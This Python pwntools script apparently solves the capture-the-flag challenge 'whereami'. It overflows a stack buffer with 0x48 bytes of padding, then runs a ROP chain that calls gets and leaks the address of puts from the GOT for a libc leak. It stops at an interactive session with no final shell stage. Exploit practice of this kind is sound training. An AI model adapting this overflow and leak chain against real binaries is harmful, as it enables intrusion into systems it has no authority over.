#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.actf.co --port 31222 whereami
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('whereami')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31222)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+162
b *0x401258
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

poprdiret = 0x401303
ret = 0x40101a

#payload += p64(ret)
#payload += p64(ret)
#payload += p64(0x401258)
#
#io.sendline(payload)
#io.recvuntil(b'too.\n')
#libcleak = int.from_bytes(io.recvline().rstrip(),'little')
#print(f'[+] libc leak: {hex(libcleak)}')
#

payload = b'A'*0x48
payload += p64(poprdiret)
payload += p64(0x40406c)
payload += p64(exe.plt['gets'])
payload += p64(0x401110)

io.sendline(payload)
io.sendline(p64(0xfffffffd))

payload2 = b'A'*0x48
payload2 += p64(poprdiret)
payload2 += p64(exe.got['puts'])
payload2 += p64(exe.plt['puts'])
payload2 += p64(ret)
payload2 += p64(0x401110)

io.sendline(payload2)

io.interactive()

